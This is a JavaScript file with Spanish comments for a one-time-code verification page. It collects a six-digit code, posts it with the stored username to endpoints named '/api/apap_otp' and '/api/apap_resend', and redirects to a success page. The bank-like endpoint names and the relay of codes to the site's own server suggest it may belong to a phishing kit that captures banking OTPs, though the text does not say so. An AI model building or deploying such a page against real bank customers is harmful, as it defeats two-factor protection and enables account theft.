document.addEventListener('DOMContentLoaded', function() {
    // Elementos del DOM
    const otpForm = document.getElementById('otpForm');
    const otpInputs = document.querySelectorAll('.otp-input');
    const otpCodeInput = document.getElementById('otpCode');
    const resendLink = document.getElementById('resendLink');
    const contactText = document.getElementById('contact-text');
    const loadingOverlay = document.getElementById('loading-overlay');
    const loadingMessage = document.getElementById('loading-message');
    
    // Obtener usuario actual del localStorage
    const currentUser = localStorage.getItem('currentUser');
    let canResend = true;
    let resendTimeout;
    
    // Configurar máscara para el contacto
    function setupContactInfo() {
        // En una implementación real, esto vendría del servidor o localStorage
        const contactInfo = localStorage.getItem('userContact') || 'usuario@ejemplo.com';
        contactText.textContent = contactInfo;
    }
    
    // Manejar entrada de OTP
    otpInputs.forEach((input, index) => {
        // Permitir solo números
        input.addEventListener('input', (e) => {
            const value = e.target.value;
            if (value && !/^\d+$/.test(value)) {
                e.target.value = '';
                return;
            }
            
            // Mover al siguiente campo
            if (value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            
            // Actualizar el valor del código completo
            updateOtpCode();
        });
        
        // Manejar tecla de borrar
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });
    
    // Actualizar el valor del código OTP completo
    function updateOtpCode() {
        let code = '';
        otpInputs.forEach(input => {
            code += input.value || '';
        });
        otpCodeInput.value = code;
    }
    
    // Enviar código OTP
    otpForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const otpCode = otpCodeInput.value;
        
        if (otpCode.length !== 6) {
            showError('Por favor ingrese un código de 6 dígitos');
            return;
        }
        
        if (!currentUser) {
            showError('Sesión no válida. Por favor, intente iniciar sesión nuevamente.');
            return;
        }
        
        showLoading('Verificando código...');
        
        try {
            const response = await fetch('/api/apap_otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    usuario: currentUser,
                    codigo_otp: otpCode
                })
            });
            
            const data = await response.json();
            
            if (!response.ok) {
                throw new Error(data.message || 'Error al verificar el código');
            }
            
            // Redirigir a la página de éxito
            window.location.href = 'exito.html';
            
        } catch (error) {
            showError(error.message || 'Código incorrecto. Por favor intente nuevamente.');
            // Limpiar campos en caso de error
            otpInputs.forEach(input => input.value = '');
            otpInputs[0].focus();
        } finally {
            hideLoading();
        }
    });
    
    // Reenviar código OTP
    window.resendOTP = async function() {
        if (!canResend) return;
        
        if (!currentUser) {
            showError('Sesión no válida');
            return;
        }
        
        showLoading('Enviando nuevo código...');
        
        try {
            const response = await fetch('/api/apap_resend', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    usuario: currentUser,
                    nota: 'Usuario solicitó reenvío de código OTP'
                })
            });
            
            const data = await response.json();
            
            if (!response.ok) {
                throw new Error(data.message || 'Error al reenviar el código');
            }
            
            // Deshabilitar reenvío por 30 segundos
            startResendTimer();
            
        } catch (error) {
            showError(error.message || 'Error al reenviar el código. Por favor intente nuevamente.');
        } finally {
            hideLoading();
        }
    };
    
    // Temporizador para el reenvío
    function startResendTimer() {
        canResend = false;
        let seconds = 30;
        
        resendLink.style.pointerEvents = 'none';
        resendLink.style.opacity = '0.5';
        
        const updateTimer = () => {
            if (seconds <= 0) {
                clearInterval(resendTimeout);
                canResend = true;
                resendLink.textContent = 'Reenviar código';
                resendLink.style.pointerEvents = 'auto';
                resendLink.style.opacity = '1';
                return;
            }
            
            resendLink.textContent = `Reenviar en ${seconds}s`;
            seconds--;
        };
        
        updateTimer();
        resendTimeout = setInterval(updateTimer, 1000);
    }
    
    // Funciones de ayuda
    function showError(message) {
        // Implementar lógica para mostrar mensajes de error
        alert(message);
    }
    
    function showLoading(message) {
        if (loadingMessage) loadingMessage.textContent = message;
        if (loadingOverlay) loadingOverlay.style.display = 'flex';
    }
    
    function hideLoading() {
        if (loadingOverlay) loadingOverlay.style.display = 'none';
    }
    
    // Inicializar
    setupContactInfo();
    otpInputs[0].focus();
});
